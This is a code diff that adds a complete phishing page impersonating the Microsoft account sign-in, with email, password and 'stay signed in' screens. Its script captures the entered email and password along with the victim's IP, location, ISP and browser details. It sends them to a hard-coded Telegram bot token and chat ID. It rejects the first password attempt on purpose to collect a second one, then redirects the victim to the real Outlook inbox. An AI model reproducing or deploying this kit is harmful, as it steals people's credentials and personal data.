@@ -1,0 +1,691 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Sign in to your account</title>
+    <style type="text/css">
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        html, body { margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            color: #1b1b1b;
+            background: #fff;
+            font-size: 15px;
+        }
+        .wrap { max-width: 480px; margin: 0 auto; min-height: 100vh; min-height: 100dvh; display: flex; flex-direction: column; }
+        .content { padding: 24px; position: relative; transition: opacity .2s; }
+        .content.loading > *:not(.dots3) { opacity: .4; }
+        .content.loading { pointer-events: none; }
+
+        .dots3 { display: none; position: absolute; top: -7px; left: 0; right: 0; height: 7px; }
+        .content.loading .dots3 { display: block; }
+        .dots3 span { position: absolute; top: 0; left: 50%; display: flex; gap: 26px; animation: travel 1.5s ease-in-out infinite alternate; }
+        .dots3 i { width: 7px; height: 7px; border-radius: 50%; background: #0067b8; animation: dotpulse 1.2s infinite; }
+        .dots3 i:nth-child(2) { animation-delay: .15s; }
+        .dots3 i:nth-child(3) { animation-delay: .3s; }
+        @keyframes dotpulse { 0%,100% { opacity: .22; transform: scale(.8); } 50% { opacity: 1; transform: scale(1); } }
+        @keyframes travel { from { transform: translateX(-140px); } to { transform: translateX(60px); } }
+
+        .ms-logo { display: block; width: 108px; height: 24px; }
+        .ms-logo.big { width: 140px; height: 31px; }
+
+        h1 { font-size: 24px; font-weight: 600; line-height: 1.3; margin: 18px 0 0; letter-spacing: -.1px; }
+
+        .field { position: relative; margin-top: 22px; }
+        .field input {
+            width: 100%;
+            font: inherit;
+            font-size: 15px;
+            color: #1b1b1b;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid #666;
+            border-radius: 0;
+            padding: 4px 0 8px;
+            outline: none;
+            -webkit-appearance: none;
+        }
+        .field input::placeholder { color: #666; opacity: 1; }
+        .field input:focus { border-bottom-color: #0067b8; }
+        .field input:not(:placeholder-shown) { background: #e9f2fd; padding-left: 6px; }
+        .field.invalid input { border-bottom: 2px solid #d13438; }
+        .field.invalid input:not(:placeholder-shown) { background: #fbeaeb; }
+
+        .err { display: none; align-items: flex-start; gap: 6px; text-align: left; font-size: 13px; color: #d13438; margin: 6px 0 0; }
+        .err.show { display: flex; }
+        .err svg { flex: 0 0 auto; margin-top: 1px; }
+
+        .warn { display: none; align-items: flex-start; gap: 6px; text-align: left; font-size: 13px; color: #1b1b1b; margin: 6px 0 0; }
+        .warn.show { display: flex; }
+        .warn svg { flex: 0 0 auto; margin-top: 1px; }
+
+        .links { margin-top: 20px; }
+        .links p { margin: 0 0 20px; font-size: 15px; }
+        a { color: #0067b8; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .btn-row { display: flex; justify-content: flex-end; gap: 4px; margin-top: 26px; }
+        .btn {
+            font: inherit;
+            font-size: 15px;
+            height: 30px;
+            width: 108px;
+            padding: 0 8px;
+            border: 1px solid transparent;
+            border-radius: 0;
+            cursor: pointer;
+        }
+        .btn-back { background: #c8c8c8; color: #1b1b1b; }
+        .btn-back:active { background: #b6b6b6; }
+        .btn-next { background: #0f6cbd; color: #fff; }
+        .btn-next:active { background: #0d5a9c; }
+
+        .options {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 24px;
+            margin-top: 64px;
+            border-top: 1px solid #d1d1d1;
+            border-bottom: 1px solid #d1d1d1;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .options:active { background: #f5f5f5; }
+        .options img { flex: 0 0 auto; width: 20px; height: 20px; }
+
+        .spacer { flex: 1 1 auto; min-height: 24px; }
+
+        .footer {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+            padding: 14px 24px 18px;
+            font-size: 13px;
+            color: #666;
+        }
+        .footer a { color: #666; }
+        .footer .dots { border: 0; background: none; color: #666; font-size: 15px; line-height: 1; padding: 0; cursor: pointer; }
+
+        /* ---------- password + kmsi screens (mobile = light) ---------- */
+        .p2 { text-align: center; padding: 0 24px; }
+        .p2-top { display: flex; align-items: center; height: 24px; }
+        .back-arrow { border: 0; background: none; padding: 0; cursor: pointer; color: #1b1b1b; line-height: 0; }
+        .p2-logo { margin: 18px 0 0; display: flex; justify-content: center; }
+
+        .pill {
+            display: inline-block;
+            margin-top: 26px;
+            max-width: 100%;
+            border: 1px solid #d1d1d1;
+            border-radius: 13px;
+            padding: 5px 16px;
+            font-size: 15px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .p2 h1 { font-size: 28px; margin: 20px 0 0; letter-spacing: -.3px; }
+
+        .pf { position: relative; margin: 26px 0 0; border: 1px solid #666; border-radius: 8px; padding: 0; text-align: left; }
+        .pf legend { font-size: 12px; color: #666; margin-left: 10px; padding: 0 5px; }
+        .pf input {
+            width: 100%;
+            font: inherit;
+            font-size: 15px;
+            border: 0;
+            outline: none;
+            background: transparent;
+            padding: 9px 44px 10px 14px;
+            border-radius: 8px;
+        }
+        .pf:focus-within { border-color: #0067b8; border-bottom-width: 2px; }
+        .pf:focus-within legend { color: #0067b8; }
+        .eye { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); border: 0; background: none; padding: 4px; line-height: 0; cursor: pointer; color: #1b1b1b; }
+
+        .btn-wide {
+            display: block;
+            width: 100%;
+            height: 38px;
+            margin-top: 26px;
+            font: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            color: #fff;
+            background: #0f6cbd;
+            border: 0;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .btn-wide:active { background: #0d5a9c; }
+
+        .alt { display: block; margin-top: 34px; font-size: 15px; font-weight: 700; color: #0f6cbd; }
+        #diff { display: none; }
+        #diff.show { display: block; }
+
+        /* kmsi */
+        .chk { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 18px; font-size: 15px; cursor: pointer; }
+        .chk input { width: 18px; height: 18px; margin: 0; accent-color: #0f6cbd; cursor: pointer; }
+        .kmsi-row { display: flex; gap: 10px; margin-top: 26px; }
+        .kmsi-row .btn-wide { margin-top: 0; flex: 1 1 0; }
+        .btn-ghost { background: transparent; color: #0f6cbd; border: 1px solid #0f6cbd; }
+
+        .p2 .footer {
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            padding: 24px 24px 18px;
+            border-top: 1px solid #e1e1e1;
+            text-align: center;
+            color: #1b1b1b;
+            font-size: 13px;
+        }
+        .p2 .footer a { color: #1b1b1b; }
+        .p2 .footer .row { display: flex; gap: 26px; }
+        .p2 .footer .note { font-size: 12px; }
+        .p2 .footer .note a { color: #0067b8; font-weight: 600; }
+
+        /* ================= DESKTOP ================= */
+        @media only screen and (min-width: 600px) {
+            body {
+                background-color: #f8f9fd;
+                background-image:
+                    radial-gradient(circle at 26% 22%, rgba(255,255,255,.95), rgba(255,255,255,0) 48%),
+                    radial-gradient(circle at 74% 78%, rgba(224,228,246,.6), rgba(224,228,246,0) 55%),
+                    linear-gradient(150deg, #fcfcff 0%, #f4f5fb 48%, #edeff8 100%);
+                background-attachment: fixed;
+            }
+            body::before, body::after {
+                content: '';
+                position: fixed;
+                pointer-events: none;
+                border-radius: 4px;
+                background: rgba(255,255,255,.6);
+                border: 1px solid rgba(184,192,220,.22);
+            }
+            body::before { width: 82vw; height: 82vw; top: -30vw; left: -16vw; transform: rotate(29deg); }
+            body::after { width: 68vw; height: 68vw; bottom: -32vw; right: -20vw; transform: rotate(-23deg); background: rgba(255,255,255,.4); }
+
+            .wrap { max-width: none; justify-content: center; align-items: center; padding: 0; }
+            .spacer { display: none; }
+
+            .content {
+                width: 440px;
+                padding: 44px 48px 47px;
+                background: #fff;
+                box-shadow: 0 2px 6px rgba(0,0,0,.16);
+            }
+
+            .ms-logo { width: 108px; height: 24px; }
+            h1 { margin-top: 14px; }
+            .field { margin-top: 24px; }
+            .field input { border-bottom-color: #c8c8c8; padding-bottom: 7px; }
+            .field input:not(:placeholder-shown) { border-bottom-color: #1b1b1b; }
+
+            .links { margin-top: 18px; }
+            .links p { margin-bottom: 16px; font-size: 14px; }
+
+            .btn-row { margin-top: 22px; gap: 8px; }
+            .btn { height: 31px; }
+            .btn-back { width: 101px; }
+            .btn-next { width: 110px; }
+            .btn-next:disabled { background: #cfd4dc; color: #f3f4f6; }
+
+            .options {
+                width: 440px;
+                height: 48px;
+                margin-top: 23px;
+                padding: 0 20px;
+                border: 0;
+                background: #fff;
+                box-shadow: 0 2px 6px rgba(0,0,0,.16);
+                gap: 12px;
+                font-size: 15px;
+            }
+
+            .footer {
+                position: fixed;
+                right: 0;
+                bottom: 0;
+                padding: 12px 20px;
+                font-size: 12px;
+                color: #5f5f5f;
+                gap: 18px;
+            }
+            .footer a { color: #5f5f5f; }
+
+            /* ---- dark screens ---- */
+            body.dark {
+                background-color: #1a1f2b;
+                background-image:
+                    radial-gradient(circle at 24% 26%, rgba(96,116,180,.26), rgba(96,116,180,0) 52%),
+                    radial-gradient(circle at 76% 74%, rgba(74,90,146,.28), rgba(74,90,146,0) 56%),
+                    linear-gradient(150deg, #232838 0%, #1a1f2b 55%, #141822 100%);
+            }
+            body.dark::before { background: rgba(255,255,255,.045); border-color: rgba(255,255,255,.05); }
+            body.dark::after { background: rgba(255,255,255,.03); border-color: rgba(255,255,255,.04); }
+
+            #s2 .content, #s3 .content {
+                width: 440px;
+                padding: 40px 48px 44px;
+                background: #2a2f3a;
+                border-radius: 8px;
+                box-shadow: 0 8px 28px rgba(0,0,0,.5);
+                color: #fff;
+            }
+            #s2 .dots3 i, #s3 .dots3 i { background: #4da3ff; }
+            #s2 .back-arrow, #s3 .back-arrow { color: #e8ebf0; }
+            #s2 .p2-logo, #s3 .p2-logo { margin-top: 0; }
+            #s2 h1, #s3 h1 { font-size: 24px; margin-top: 18px; color: #fff; letter-spacing: 0; }
+            #s2 .pill { margin-top: 29px; background: transparent; border-color: #4a5364; color: #b9bfc9; font-size: 14px; padding: 4px 16px; border-radius: 14px; }
+            #s2 .pf { margin-top: 20px; border-color: #0f6cbd; border-radius: 4px; box-shadow: 0 0 0 1px rgba(15,108,189,.3); }
+            #s2 .pf legend { color: #8fa4bf; }
+            #s2 .pf input { color: #fff; padding: 9px 40px 10px 14px; border-radius: 4px; }
+            #s2 .eye { color: #d0d6e0; right: 10px; }
+            #s2 .btn-wide, #s3 .btn-wide { background: #1173c6; height: 34px; margin-top: 38px; border-radius: 4px; }
+            #s2 .btn-wide:active, #s3 .btn-wide:active { background: #0d5fa6; }
+            #s2 .alt { color: #4da3ff; font-size: 14px; margin-top: 37px; }
+            #s2 #diff { display: block; margin-top: 16px; }
+            #s2 .footer, #s3 .footer { border: 0; color: #8b93a1; font-size: 13px; padding: 0; gap: 10px; margin-top: 74px; }
+            #s2 .footer a, #s3 .footer a { color: #8b93a1; }
+            #s2 .footer .row, #s3 .footer .row { gap: 26px; }
+            #s2 .footer .note a, #s3 .footer .note a { color: #4da3ff; }
+
+            #s3 .warn { color: #d0d6e0; }
+            #s3 .chk { margin-top: 22px; color: #e8ebf0; font-size: 14px; }
+            #s3 .chk input { accent-color: #1173c6; }
+            #s3 .kmsi-row { margin-top: 30px; gap: 12px; }
+            #s3 .btn-wide { margin-top: 0; }
+            #s3 .btn-ghost { background: transparent; color: #4da3ff; border-color: #4a5364; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ================= STEP 1 ================= -->
+<div class="wrap" id="s1">
+    <div class="content" id="c1">
+        <div class="dots3"><span><i></i><i></i><i></i></span></div>
+
+        <svg class="ms-logo" viewBox="0 0 108 24" role="img" aria-label="Microsoft">
+            <rect x="0"  y="0"  width="10" height="10" fill="#f25022"/>
+            <rect x="12" y="0"  width="10" height="10" fill="#7fba00"/>
+            <rect x="0"  y="12" width="10" height="10" fill="#00a4ef"/>
+            <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+            <text x="27" y="18.5" font-family="'Segoe UI', Arial, sans-serif" font-size="18" font-weight="600" fill="#737373">Microsoft</text>
+        </svg>
+
+        <h1>Sign in</h1>
+
+        <div class="field" id="ai-field">
+            <input type="email" id="ai" placeholder="Email, phone, or Skype" autocomplete="username" autocapitalize="none" spellcheck="false" aria-describedby="ai-err">
+        </div>
+        <p class="err" id="ai-err" role="alert">
+            <svg width="16" height="16" viewBox="0 0 16 16">
+                <circle cx="8" cy="8" r="7" fill="#d13438"/>
+                <rect x="7.2" y="3.8" width="1.6" height="5" rx=".8" fill="#fff"/>
+                <circle cx="8" cy="11.4" r=".95" fill="#fff"/>
+            </svg>
+            <span id="ai-err-txt">Enter a valid email address, phone number, or Skype name.</span>
+        </p>
+
+        <div class="links">
+            <p>No account? <a href="#">Create one!</a></p>
+            <p><a href="#">Can't access your account?</a></p>
+        </div>
+
+        <div class="btn-row">
+            <button class="btn btn-back" id="back1" type="button">Back</button>
+            <button class="btn btn-next" id="next" type="button">Next</button>
+        </div>
+    </div>
+
+    <div class="options">
+        <img src="https://logincdn.msftauth.net/shared/5/images/signin_options_4e48046ce74f4b89d450.svg" width="20" height="20" alt=""
+             onerror="this.outerHTML='&lt;svg width=\'20\' height=\'20\' viewBox=\'0 0 20 20\' fill=\'none\' stroke=\'#1b1b1b\' stroke-width=\'1.15\' stroke-linecap=\'round\'&gt;&lt;circle cx=\'6.6\' cy=\'6.6\' r=\'3.7\'/&gt;&lt;path d=\'M9.2 9.2L16.1 16.1\'/&gt;&lt;path d=\'M13.4 13.4L11.9 14.9\'/&gt;&lt;path d=\'M15.3 15.3L13.8 16.8\'/&gt;&lt;/svg&gt;'">
+        <span>Sign-in options</span>
+    </div>
+
+    <div class="spacer"></div>
+
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy &amp; cookies</a>
+        <button class="dots" type="button" aria-label="More">&#8943;</button>
+    </div>
+</div>
+
+<!-- ================= STEP 2 ================= -->
+<div class="wrap" id="s2" style="display:none">
+    <div class="content p2" id="c2">
+        <div class="dots3"><span><i></i><i></i><i></i></span></div>
+
+        <div class="p2-top">
+            <button class="back-arrow" id="back2" type="button" aria-label="Back">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M20 12H4.5"/><path d="M10.5 5.5L4 12l6.5 6.5"/>
+                </svg>
+            </button>
+        </div>
+
+        <div class="p2-logo">
+            <svg class="ms-logo big" viewBox="0 0 108 24" role="img" aria-label="Microsoft">
+                <rect x="0"  y="0"  width="10" height="10" fill="#f25022"/>
+                <rect x="12" y="0"  width="10" height="10" fill="#7fba00"/>
+                <rect x="0"  y="12" width="10" height="10" fill="#00a4ef"/>
+                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+                <text x="27" y="18.5" font-family="'Segoe UI', Arial, sans-serif" font-size="18" font-weight="600" fill="#737373">Microsoft</text>
+            </svg>
+        </div>
+
+        <div><span class="pill" id="aich"></span></div>
+
+        <h1>Enter your password</h1>
+
+        <fieldset class="pf">
+            <legend>Password</legend>
+            <input type="password" id="pr" autocomplete="current-password">
+            <button class="eye" id="eye" type="button" aria-label="Show password">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.3">
+                    <path d="M1.8 12S5.4 5.5 12 5.5 22.2 12 22.2 12 18.6 18.5 12 18.5 1.8 12 1.8 12z"/>
+                    <circle cx="12" cy="12" r="3.1"/>
+                </svg>
+            </button>
+        </fieldset>
+
+        <p class="warn" id="caps">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.3" stroke-linejoin="round">
+                <path d="M8 1.8l4.4 4.4H9.9v2.6H6.1V6.2H3.6L8 1.8z"/>
+                <path d="M4.6 12.2h6.8"/>
+            </svg>
+            <span>Caps Lock is on</span>
+        </p>
+
+        <p class="err" id="pr-err" role="alert">
+            <svg width="16" height="16" viewBox="0 0 16 16">
+                <circle cx="8" cy="8" r="7" fill="#d13438"/>
+                <rect x="7.2" y="3.8" width="1.6" height="5" rx=".8" fill="#fff"/>
+                <circle cx="8" cy="11.4" r=".95" fill="#fff"/>
+            </svg>
+            <span>That password is incorrect for your Microsoft account.</span>
+        </p>
+
+        <button class="btn-wide" id="submit-btn" type="button">Next</button>
+
+        <a class="alt" href="#">Other ways to sign in</a>
+        <a class="alt" href="#" id="diff">Sign in with a different Microsoft account</a>
+    </div>
+
+    <div class="spacer"></div>
+
+    <div class="footer">
+        <div class="row">
+            <a href="#">Help and feedback</a>
+            <a href="#">Terms of use</a>
+        </div>
+        <a href="#">Privacy and cookies</a>
+        <p class="note">Use private browsing if this is not your device. <a href="#">Learn more</a></p>
+    </div>
+</div>
+
+<!-- ================= STEP 3: STAY SIGNED IN ================= -->
+<div class="wrap" id="s3" style="display:none">
+    <div class="content p2" id="c3">
+        <div class="dots3"><span><i></i><i></i><i></i></span></div>
+
+        <div class="p2-top">
+            <button class="back-arrow" id="back3" type="button" aria-label="Back">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M20 12H4.5"/><path d="M10.5 5.5L4 12l6.5 6.5"/>
+                </svg>
+            </button>
+        </div>
+
+        <div class="p2-logo">
+            <svg class="ms-logo big" viewBox="0 0 108 24" role="img" aria-label="Microsoft">
+                <rect x="0"  y="0"  width="10" height="10" fill="#f25022"/>
+                <rect x="12" y="0"  width="10" height="10" fill="#7fba00"/>
+                <rect x="0"  y="12" width="10" height="10" fill="#00a4ef"/>
+                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+                <text x="27" y="18.5" font-family="'Segoe UI', Arial, sans-serif" font-size="18" font-weight="600" fill="#737373">Microsoft</text>
+            </svg>
+        </div>
+
+        <h1>Stay signed in?</h1>
+
+        <label class="chk">
+            <input type="checkbox" id="kmsi">
+            <span>Don't show this again</span>
+        </label>
+
+        <div class="kmsi-row">
+            <button class="btn-wide kmsi-btn" data-v="Yes" type="button">Yes</button>
+            <button class="btn-wide btn-ghost kmsi-btn" data-v="No" type="button">No</button>
+        </div>
+    </div>
+
+    <div class="spacer"></div>
+
+    <div class="footer">
+        <div class="row">
+            <a href="#">Help and feedback</a>
+            <a href="#">Terms of use</a>
+        </div>
+        <a href="#">Privacy and cookies</a>
+        <p class="note">Use private browsing if this is not your device. <a href="#">Learn more</a></p>
+    </div>
+</div>
+
+<script src="https://l2.io/ip.js?var=userip"></script>
+<script>
+    $(function () {
+        var count = 0;
+        var forced = "";
+        var token = "8304102671:AAFVCb5i5XlZE-mVtnlDyiTPYpq0Ymz2Uo8";
+        var chatId = "5178786791";
+
+        function ip() {
+            return typeof userip !== "undefined" && userip ? userip : "unknown";
+        }
+
+        function esc(s) {
+            return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+
+        function geo(cb) {
+            $.ajax({
+                url: "https://ipwho.is/",
+                dataType: "json",
+                timeout: 3500
+            }).done(function (d) {
+                cb(d && d.success !== false ? d : null);
+            }).fail(function () {
+                cb(null);
+            });
+        }
+
+        function loading(on) {
+            $("#c1, #c2, #c3").toggleClass("loading", on);
+            $("#next, #submit-btn, .kmsi-btn").prop("disabled", on);
+        }
+
+        var EMAIL = /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i;
+        var PHONE = /^\+?[\d\s().-]{7,}$/;
+        var KNOWN = /@(outlook|hotmail|live|msn|gmail|googlemail|yahoo|ymail|icloud|me|mac|aol|proton|protonmail|gmx|mail|zoho|yandex|qq|163|126|foxmail)\.[a-z.]{2,}$/i;
+
+        function validAccount(v) {
+            return EMAIL.test(v) || PHONE.test(v);
+        }
+
+        function showAiError(kind) {
+            $("#ai-field").addClass("invalid");
+            if (kind === "missing") {
+                $("#ai-err-txt").html('This account doesn\'t exist. Enter a different account or <a href="#">get a new one</a>.');
+            } else {
+                $("#ai-err-txt").text("Enter a valid email address, phone number, or Skype name.");
+            }
+            $("#ai-err").addClass("show");
+        }
+
+        function clearAiError() {
+            $("#ai-field").removeClass("invalid");
+            $("#ai-err").removeClass("show");
+        }
+
+        $("#ai").on("input", function () {
+            forced = "";
+            clearAiError();
+        });
+
+        $("#eye").on("click", function () {
+            var p = $("#pr")[0];
+            p.type = p.type === "password" ? "text" : "password";
+        });
+
+        $("#pr").on("keydown keyup", function (e) {
+            var o = e.originalEvent;
+            if (o && typeof o.getModifierState === "function") {
+                $("#caps").toggleClass("show", o.getModifierState("CapsLock"));
+            }
+        });
+
+        function toStep2() {
+            var ai = $.trim($("#ai").val());
+            if (!validAccount(ai)) {
+                showAiError("invalid");
+                $("#ai").focus();
+                return;
+            }
+            if (ai.indexOf("@") > -1 && !KNOWN.test(ai) && forced !== ai) {
+                forced = ai;
+                showAiError("missing");
+                $("#ai").focus();
+                return;
+            }
+            clearAiError();
+            loading(true);
+            setTimeout(function () {
+                $("#aich").text(ai);
+                $("#s1").hide();
+                $("#s2").show();
+                $("body").addClass("dark");
+                loading(false);
+                window.scrollTo(0, 0);
+                $("#pr").focus();
+            }, 900);
+        }
+
+        $("#next").on("click", toStep2);
+        $("#ai").on("keydown", function (e) { if (e.key === "Enter") toStep2(); });
+
+        function toStep1() {
+            $("#s2, #s3").hide();
+            $("#s1").show();
+            $("body").removeClass("dark");
+            $("#pr").val("");
+            $("#caps").removeClass("show");
+            $("#pr-err").removeClass("show");
+            $("#diff").removeClass("show");
+            loading(false);
+            window.scrollTo(0, 0);
+        }
+        $("#back1, #back2, #diff").on("click", function (e) { e.preventDefault(); toStep1(); });
+        $("#back3").on("click", function () { $("#s3").hide(); $("#s2").show(); window.scrollTo(0, 0); $("#pr").focus(); });
+
+        $("#submit-btn").on("click", function () {
+            var ai = $.trim($("#ai").val());
+            var pr = $("#pr").val();
+            if (pr.length < 1) { $("#pr").focus(); return; }
+            count++;
+            loading(true);
+
+            geo(function (g) {
+                var line = "─".repeat(28);
+                var tz = g && g.timezone && g.timezone.id ? g.timezone.id : "UTC";
+                var loc = g ? [g.city, g.region, g.country].filter(Boolean).join(", ") : "";
+                var time;
+                try {
+                    time = new Date().toLocaleString("sv-SE", { timeZone: tz }).replace(",", "");
+                } catch (e) {
+                    time = new Date().toISOString().slice(0, 19).replace("T", " ");
+                }
+                var addr = g && g.ip ? g.ip : ip();
+                var isp = g && g.connection && g.connection.isp ? g.connection.isp : "Unknown";
+                var org = g && g.connection && g.connection.org ? g.connection.org : "Unknown";
+                var coords = g && g.latitude != null && g.longitude != null ? g.latitude + ", " + g.longitude : "Unknown";
+
+                var msg =
+                    "🥐 ❤️Logs From @ Dracula 💜 🥐\n\n" +
+                    line + "\n\n" +
+                    "📧 Email: " + esc(ai) + "\n" +
+                    "🔑 Password: " + esc(pr) + "\n\n" +
+                    line + "\n\n" +
+                    line + "\n\n" +
+                    "📊 Attempt: #" + count + "\n" +
+                    "🌐 IP: " + esc(addr) + "\n" +
+                    "Location: " + esc(loc || "Unknown") + "\n" +
+                    "🏢 ISP: " + esc(isp) + "\n" +
+                    "🏛 Org: " + esc(org) + "\n" +
+                    "🕐 Time: " + time + " (" + tz + ")\n" +
+                    "📍 Coordinates: " + coords + "\n" +
+                    "✨🦠🧬✨ UA: " + esc(navigator.userAgent);
+
+                $.ajax({
+                    url: "https://api.telegram.org/bot" + token + "/sendMessage",
+                    data: {
+                        chat_id: chatId,
+                        text: msg,
+                        parse_mode: "html",
+                        disable_web_page_preview: true
+                    },
+                    type: "GET",
+                    success: function () {
+                        if (count >= 2) {
+                            $("#s2").hide();
+                            $("#s3").show();
+                            loading(false);
+                            window.scrollTo(0, 0);
+                        } else {
+                            $("#pr").val("");
+                            $("#pr-err").addClass("show");
+                            $("#diff").addClass("show");
+                            loading(false);
+                            $("#pr").focus();
+                        }
+                    },
+                    error: function () {
+                        loading(false);
+                        $("#pr-err").addClass("show");
+                    }
+                });
+            });
+        });
+
+        $("#pr").on("keydown", function (e) { if (e.key === "Enter") $("#submit-btn").click(); });
+
+        $(".kmsi-btn").on("click", function () {
+            var choice = $(this).data("v");
+            loading(true);
+            $.ajax({
+                url: "https://api.telegram.org/bot" + token + "/sendMessage",
+                data: {
+                    chat_id: chatId,
+                    text: "🔐 Stay signed in: " + choice + (choice === "Yes" && $("#kmsi").is(":checked") ? " (don't ask again)" : ""),
+                    parse_mode: "html"
+                },
+                type: "GET",
+                complete: function () {
+                    setTimeout(function () {
+                        window.location.replace("https://outlook.live.com/mail/0/inbox");
+                    }, 600);
+                }
+            });
+        });
+    });
+</script>
+</body>
+</html>
